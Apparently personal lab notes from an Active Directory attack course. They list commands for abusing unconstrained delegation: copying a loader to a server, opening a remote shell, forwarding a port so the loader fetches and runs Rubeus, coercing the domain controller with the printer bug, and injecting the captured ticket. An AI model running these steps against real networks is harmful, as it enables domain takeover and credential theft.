![[Pasted image 20250627175853.png]]


# Q1

![[Pasted image 20250627180020.png]]
```
Get-DomainComputer -Unconstrained | select -ExpandProperty samaccountname
```

![[Pasted image 20250627180236.png]]

```
C:\Windows\system32>echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-appsrv\C$\Users\Public\Loader.exe /Y
```

```
C:\Windows\system32>winrs -r:dcorp-appsrv cmd
```

```
C:\Users\appadmin>netsh interface portproxy add v4tov4 listenport-8080 listenaddress-0.0.0.0 connectport=80 connectaddress=172.16.100.1
```

```
C:\Users\Public\Loader.exe path http://127.0.0.1:8080/Rubeus.exe -args monitor/targetuser: DCORP-DC$/interval:5/nowrap
```

```
C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```

the above command is used to force server 1 t connec to dc



```
-C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args ptt /
ticket:paste the ticket that you got after the server was forced to connect
```

